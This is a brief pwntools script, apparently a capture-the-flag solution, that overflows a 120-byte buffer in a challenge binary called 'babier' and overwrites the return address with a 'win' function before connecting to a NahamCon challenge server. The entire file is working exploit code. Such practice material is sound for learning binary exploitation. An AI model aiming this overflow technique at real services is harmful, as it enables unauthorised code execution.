from pwn import *

elf = ELF("./babier")

offset = 120

#p = elf.process()

p = remote("challenge.nahamcon.com", 31842)

p.recvuntil(b"scanf?\n")

payload = b'A'*120
payload += p64(elf.symbols['win'])

p.sendline(payload)
p.interactive()
